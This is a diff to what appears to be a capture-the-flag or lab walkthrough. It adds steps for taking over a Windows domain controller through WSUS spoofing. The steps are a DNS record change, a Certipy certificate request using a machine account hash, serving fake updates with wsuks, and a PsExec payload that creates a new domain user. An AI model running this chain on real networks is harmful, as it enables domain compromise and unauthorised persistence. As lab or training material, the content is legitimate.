@@ -25,4 +25,23 @@
    2. `server agile-corp.hacklu`
    3. `zone agile-corp.hacklu`
    4. `update add wsus.agile-corp.hacklu. 86400 A 192.168.108.137`
-   5. `send`
+   5. `update delete wsus.agile-corp.hacklu. A 172.16.10.10`
+   6. `send`
+10. `certipy req -dc-ip 192.168.108.10 -u SRV$ -hashes c05529a83e9df1e168d860edcb7cfa79 -template WebServer -target DC.agile-corp.hacklu -ca agile-corp-Root-CA -dns wsus.agile-corp.hacklu`
+11. `openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:`
+12. `sudo wsuks --WSUS-Server 192.168.108.10 --tls-cert wsus.pem --serve-only`
+13. Wait up to 5 minutes for WSUS updates on the DC.
+
+
+#### Manual invocations
+WSUKS command:
+```Powershell
+PsExec64.exe /accepteula /s powershell.exe "New-ADUser -Name user89834 -AccountPassword $(ConvertTo-SecureString mlOwZvWq9sb31! -AsPlainText -Force) -Enabled $true"
+```
+
+
+```Powershell
+ipconfig /flushdns
+Import-Module PSWindowsUpdate
+Install-WindowsUpdate -AcceptAll -Install
+```
